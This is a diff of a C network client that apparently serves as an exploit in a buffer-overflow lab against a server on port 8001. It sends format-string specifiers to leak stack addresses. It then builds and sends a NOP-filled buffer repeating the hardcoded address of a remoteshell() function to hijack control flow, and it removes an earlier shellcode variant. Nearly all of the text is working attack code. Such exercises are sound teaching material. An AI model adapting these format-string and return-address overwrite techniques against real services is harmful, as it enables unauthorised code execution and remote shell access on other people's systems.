@@ -15,15 +15,12 @@
 #define	PORTNUM	8001
 #define	BLENGTH	256
 
-static char shellcode[] =
-"\x08\x04\x89\x94";
-
 /* Send our name to the server */
 static void
 send_name(int s)
 {
   char buffer[BLENGTH];
-  char response_buffer[] = "%p %p %p %p %p";
+  char response_buffer[] = "%p %p %p %p %p %p";
 
   /* Receive a prompt from the server */
   recv(s, (void *)buffer, BLENGTH, MSG_WAITALL);
@@ -48,43 +45,27 @@ send_name(int s)
 static void
 send_message(int s)
 {
-	char buffer[BLENGTH];
-	char response_buffer[BLENGTH];
-	int numints = 140;
-	int dummy_addr = 134515092; // integer value of 0x8048994 which is the location of the function dummy()
-        int reverseshell_addr = 134515320; // integer value of 0x80489a8 which is the location of the function remoteshell()
-
-	char *buff, *ptr;
-	long *addr_ptr, addr;
 	int i;
+	long *addr_ptr, addr;
+	char request_buffer[BLENGTH];
+	
+	int reverseshell_addr = 0x8048a78; // location of the function remoteshell()
+
 	
 	addr = reverseshell_addr;
 	printf("Using address: 0x%x\n", addr);
 	
-	ptr = response_buffer;
-	addr_ptr = (long *) ptr;
-	for (i = 0; i < numints; i+=4)
+	// Set the entire responseb buffer to NOP
+	memset(request_buffer, 0x90, BLENGTH);
+	
+	addr_ptr = (long *) request_buffer;
+	for (i = 0; i < BLENGTH; i+=4)
 	*(addr_ptr++) = addr;
-		
-	ptr += 4;  
-	for (i = 0; i < strlen(shellcode); i++)
-	*(ptr++) = shellcode[i];
 	
-	response_buffer[numints - 1] = '\0';
-	
-	memcpy(response_buffer,"EGG=",4);
+	request_buffer[BLENGTH - 1] = '\0';
 
-  /* Receive a prompt from the server */
-  recv(s, (void *)buffer, BLENGTH, MSG_WAITALL);
-
-  /* Display the prompt to the user */
-  fputs(buffer, stdout);
-
-  /* Read a response from the user */
-  //fgets(buffer, BLENGTH, stdin);
-
-  /* Send the response to the server */
-  send(s, (void *)response_buffer, BLENGTH, 0);
+	/* Send the attack to the server */
+	send(s, (void *)request_buffer, BLENGTH, 0);
 }
 
 /* Connect and talk to the server */
